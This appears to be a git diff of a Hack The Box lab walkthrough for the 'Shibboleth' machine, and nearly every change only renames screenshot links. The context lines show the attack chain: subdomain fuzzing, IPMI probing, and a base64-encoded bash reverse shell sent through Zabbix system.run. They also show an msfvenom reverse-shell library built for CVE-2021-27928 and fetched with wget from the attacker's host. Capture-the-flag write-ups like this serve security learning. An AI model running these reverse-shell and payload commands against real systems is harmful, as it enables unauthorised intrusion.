@@ -4,25 +4,25 @@ description: https://app.hackthebox.com/machines/410
 
 # 👁️ Shibboleth
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 After a quick nmap, we only find port 80 open, after a better look:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 looking at the webserver:
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We see some bootstrap, maybe this box has a CVE related exploit ->
 
 we also are able to pull some possible usernames:
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I also find at the end of the page some possible backend technologies that could be our entry point&#x20;
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
@@ -31,7 +31,7 @@ wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/SecL
 
 in a previous scan, we noted that all pages that returned a 302 had 26 words so the `--hw` flag is used to specify the header word to match in the response, in this case, it is set to `26`, which means the attack will stop when the response header contains the word `26`
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 there is a zabbix subdomain, so it's probably the way to go, we need to add those in the etc/hosts file
 
@@ -43,27 +43,27 @@ feroxbuster -u http://shibboleth.htb -w /usr/share/SecLists/Discovery/Web-Conten
 
 `feroxbuster`, which is a tool for web application enumeration. The command is performing a directory bruteforce attack on the target URL `http://shibboleth.htb` with the wordlist `/usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt`. The `-w` flag is used to specify the wordlist file
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 nothing very interesting
 
 The subdomains we found earlier all redirect to this page:
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 tried default creds but it did not work:
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 let's try to find other ways of going for the moment:
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption><p>bare metal bmc automation exploit</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bare metal bmc automation exploit</p></figcaption></figure>
 
 interesting, zabbix was maybe a rabbit hole
 
 we can see that default port is 623, let's check:
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We have to be extremly careful because when we type in this command:
 
@@ -71,7 +71,7 @@ We have to be extremly careful because when we type in this command:
 nmap -sCV -p 623 10.129.30.233
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 but if we type in this command
 
@@ -198,11 +198,11 @@ system.run[echo  YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4xNjYvOTg5OCAgMD4mMSA
 
 I get a persistent shell but can't access the user.txt&#x20;
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 after being a bit stuck, I saw that I was not logged in as the user who had the flag, so I tried to log in with the zabbix password found earlier and it worked:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 after a bit of looking around, we found something that could be the way to go:
 
@@ -210,7 +210,7 @@ after a bit of looking around, we found something that could be the way to go:
 netstat -tnl
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 When you run the `netstat -tnl` command, you will see a list of the current TCP and UDP connections on your system, along with their local and remote addresses and the state of the connections. This can be useful for identifying which processes are listening on which ports, and for troubleshooting network connectivity issues.
 
@@ -220,7 +220,7 @@ When you run the `netstat -tnl` command, you will see a list of the current TCP 
 
 So after looking around for possible MYSQL creds, I found this directory
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 cat zabbix_server.conf | grep -v "^#" | grep .
@@ -232,7 +232,7 @@ the command `cat zabbix_server.conf | grep -v "^#" | grep .` is used to display 
 
 `grep .`: The `grep` command is used again to search for and filter lines in the input. The `.` character is used as a pattern to match any non-empty line. This command filters out the blank lines, so that only the lines that contain text are displayed.
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bloooarskybluh</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bloooarskybluh</p></figcaption></figure>
 
 We found credentials -> let's try to connect to the mysql interface:
 
@@ -262,11 +262,11 @@ ctrl+z
 stty raw -echo; fg
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 do the switch user again and try connecting via MySQL
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption><p>bingow</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bingow</p></figcaption></figure>
 
 Let's see what's inside this databse:
 
@@ -274,21 +274,21 @@ Let's see what's inside this databse:
 show databases;
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 In the Screenshot above we can see the version of the database, let's look that up ->
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I'll go and follow the methodology ->
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.166 LPORT=9898 -f elf-so -o CVE-2021-27928.so
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption><p>and then open up a python server</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption><p>and then open up a python server</p></figcaption></figure>
 
 exit the DB to go back on the shell ->
 
@@ -296,7 +296,7 @@ exit the DB to go back on the shell ->
 wget http://10.10.14.166:8989/CVE-2021-27928.so
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption><p>i changed the name of the exploit to rev.so</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>i changed the name of the exploit to rev.so</p></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
